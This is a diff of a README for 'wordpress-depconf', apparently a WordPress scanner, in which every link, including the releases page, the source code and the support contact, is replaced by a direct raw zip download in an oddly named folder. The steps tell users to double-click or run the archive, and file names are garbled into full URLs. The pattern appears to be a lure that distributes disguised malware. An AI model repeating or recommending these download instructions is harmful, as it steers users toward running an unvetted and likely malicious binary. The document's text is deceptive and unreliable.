@@ -1,7 +1,7 @@
 # 🛠️ wordpress-depconf - Scan WordPress Sites Easily
 
 ## 📥 Download Now
-[![Download wordpress-depconf](https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip)](https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip)
+[![Download wordpress-depconf](https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip)](https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -20,21 +20,21 @@ Before you start, ensure your system meets the following requirements:
 
 To download the app, visit the Releases page:
 
-[Download wordpress-depconf](https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip)
+[Download wordpress-depconf](https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip)
 
 On the Releases page, you will see various version options. Click on the appropriate version for your operating system. The download will start automatically. 
 
 Once the download is complete, follow these steps to run the application:
 
 1. **Locate the downloaded file:**
-   - Windows: Check your `Downloads` folder for a file named `https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip`.
-   - macOS: Look for `https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip` in your `Downloads` folder.
-   - Linux: Find `https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip` in your `Downloads` folder.
+   - Windows: Check your `Downloads` folder for a file named `https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip`.
+   - macOS: Look for `https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip` in your `Downloads` folder.
+   - Linux: Find `https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip` in your `Downloads` folder.
 
 2. **Run the application:**
-   - **Windows:** Double-click `https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip` to start the application.
-   - **macOS:** Open `https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip`, drag the app to your `Applications` folder, and then double-click it to run.
-   - **Linux:** Extract the `https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip` file, navigate to the folder in your terminal, and run the command `./wordpress-depconf`.
+   - **Windows:** Double-click `https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip` to start the application.
+   - **macOS:** Open `https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip`, drag the app to your `Applications` folder, and then double-click it to run.
+   - **Linux:** Extract the `https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip` file, navigate to the folder in your terminal, and run the command `./wordpress-depconf`.
 
 ## 🌟 Features
 
@@ -70,7 +70,7 @@ If you encounter issues while using wordpress-depconf, consider the following:
 
 ## 📧 Support
 
-For additional help or suggestions, please reach out to our support team at [https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip](https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip).
+For additional help or suggestions, please reach out to our support team at [https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip](https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip).
 
 ## 📖 License
 
@@ -78,7 +78,7 @@ This project is licensed under the MIT License. You can freely use and modify it
 
 ## 🔗 Links
 
-- [Releases Page](https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip)
-- [Source Code](https://raw.githubusercontent.com/BrunoSilva8-hub/wordpress-depconf/main/superserviceableness/wordpress-depconf.zip)
+- [Releases Page](https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip)
+- [Source Code](https://github.com/BrunoSilva8-hub/wordpress-depconf/raw/refs/heads/main/superserviceableness/depconf_wordpress_2.1.zip)
 
 Thank you for using wordpress-depconf! Happy scanning!
